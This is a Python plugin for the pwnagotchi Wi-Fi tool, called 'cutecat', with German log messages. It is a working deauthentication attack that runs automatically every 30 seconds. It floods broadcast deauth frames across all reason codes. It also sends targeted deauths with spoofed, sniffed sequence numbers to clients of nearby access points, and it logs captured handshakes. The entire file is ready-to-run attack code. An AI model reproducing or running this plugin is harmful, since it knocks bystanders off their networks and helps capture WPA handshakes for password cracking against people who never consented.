#!/usr/bin/env python3
import logging
import time
import random
from typing import List

import pwnagotchi.plugins as plugins

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

BRUTAL_REASON_CODES = list(range(1, 18))

class cutecat(plugins.Plugin):
    __author__ = 'ShaddamIV'
    __version__ = '1.1'
    __description__ = 'Brutal Force Deauth (Broadcast + gezielt)'

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger(__name__)
        self.scapy_available = SCAPY_AVAILABLE
        self.inject_iface = "wlan0"
        self.attack_count = 0
        self.last_attack = 0

    def on_loaded(self):
        self.logger.info("🐱 cutecat geladen (saubere Version)")
        if not self.scapy_available:
            self.logger.error("Scapy fehlt")

    def on_config_changed(self, config):
        cfg = config["main"]["plugins"].get("cutecat", {})
        self.inject_iface = cfg.get("inject_iface", "wlan0")

    def on_ready(self, agent):
        self.agent = agent
        self.logger.info("🐱 cutecat bereit – greift jede Epoche an")

    def get_valid_sequence_number(self, ap_mac: str, cl_mac: str) -> int:
        if not self.scapy_available:
            return random.randint(1, 0xFFF)
        seq_numbers = []
        def pkt_handler(pkt):
            if pkt.haslayer(Dot11):
                if (pkt.addr1 == cl_mac and pkt.addr2 == ap_mac) or \
                   (pkt.addr1 == ap_mac and pkt.addr2 == cl_mac):
                    if hasattr(pkt, 'SC'):
                        seq_numbers.append((pkt.SC >> 4) & 0xFFF)
        sniff(iface=self.inject_iface, prn=pkt_handler, timeout=0.5, store=0)
        if seq_numbers:
            return (max(seq_numbers) + 1) & 0xFFF
        return random.randint(1, 0xFFF)

    def broadcast_deauth(self):
        """Broadcast Deauth an alle (ff:ff:ff:ff:ff:ff)"""
        bcast = "ff:ff:ff:ff:ff:ff"
        for reason in BRUTAL_REASON_CODES:
            pkt = RadioTap() / Dot11(addr1=bcast, addr2=bcast, addr3=bcast) / Dot11Deauth(reason=reason)
            try:
                sendp(pkt, iface=self.inject_iface, count=1, verbose=0)
                time.sleep(0.005)
            except:
                pass

    def targeted_deauth(self, ap_mac: str, client_macs: List[str]):
        """Gezielte Deauths auf bestimmte Clients"""
        for cl_mac in client_macs[:3]:
            seq = self.get_valid_sequence_number(ap_mac, cl_mac)
            for i, reason in enumerate(BRUTAL_REASON_CODES):
                pkt = RadioTap() / Dot11(addr1=cl_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=reason)
                pkt[Dot11].SC = ((seq + i) & 0xFFF) << 4
                try:
                    sendp(pkt, iface=self.inject_iface, count=1, verbose=0)
                    time.sleep(0.005)
                except:
                    pass

    def on_epoch(self, agent, epoch, epoch_data):
        if not self.scapy_available:
            return
        now = time.time()
        if now - self.last_attack < 30:
            return
        self.last_attack = now
        self.attack_count += 1

        self.logger.info(f"🐱 Epoche {epoch} – Angriff #{self.attack_count}")

        # Immer Broadcast-Deauths
        self.broadcast_deauth()

        # Zusätzlich gezielte Deauths, falls Clients bekannt sind
        try:
            session = agent.session() or {}
            aps = session.get('wifi', {}).get('aps', [])
            clients_found = 0
            for ap in aps:
                ap_mac = ap.get('mac')
                for cl in ap.get('clients', []):
                    cl_mac = cl.get('mac')
                    if ap_mac and cl_mac:
                        self.targeted_deauth(ap_mac, [cl_mac])
                        clients_found += 1
            if not clients_found:
                self.logger.debug("Keine Clients für gezielte Deauths")
        except Exception as e:
            self.logger.debug(f"Client-Deauths nicht möglich: {e}")

        self.logger.info(f"✅ Angriff #{self.attack_count} abgeschlossen")

    def on_handshake(self, agent, filename, access_point, client_station):
        self.logger.info(f"🎉 Handshake erfasst: {filename}")